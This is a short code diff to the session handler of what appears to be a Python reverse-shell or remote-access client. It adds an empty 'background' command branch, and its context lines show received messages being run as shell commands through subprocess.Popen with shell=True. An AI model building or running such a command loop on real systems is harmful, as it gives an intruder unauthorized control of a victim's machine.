@@ -43,6 +43,9 @@ def session_handler():
             except FileNotFoundError:
                 outbound("[-] File or directory does not exist.")
                 continue
+        
+        elif message == "background":
+            pass
 
         else:
             command = subprocess.Popen(message, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
